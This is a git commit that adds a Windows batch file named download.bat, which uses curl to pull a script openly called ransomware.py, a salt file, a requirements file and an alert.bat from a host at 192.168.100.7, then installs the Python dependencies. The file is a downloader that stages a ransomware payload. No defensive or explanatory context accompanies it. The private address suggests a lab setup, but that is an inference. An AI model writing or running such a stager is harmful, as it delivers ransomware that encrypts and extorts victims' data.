c989939775034c755b7df234f9d6eadc47be494d
joebarouk <101946493+joebarouk@users.noreply.github.com>
2024-02-04 19:03:15 +0200

    Add files via upload

---
+++ scriptScrypt/download.bat
@@ -0,0 +1,5 @@
+curl -O 192.168.100.7/scriptScrypt/ransomware.py
+curl -O 192.168.100.7/scriptScrypt/requirements.txt
+curl -O 192.168.100.7/scriptScrypt/salt.salt
+curl -O 192.168.100.7/notice/alert.bat
+pip install -r requirements.txt 
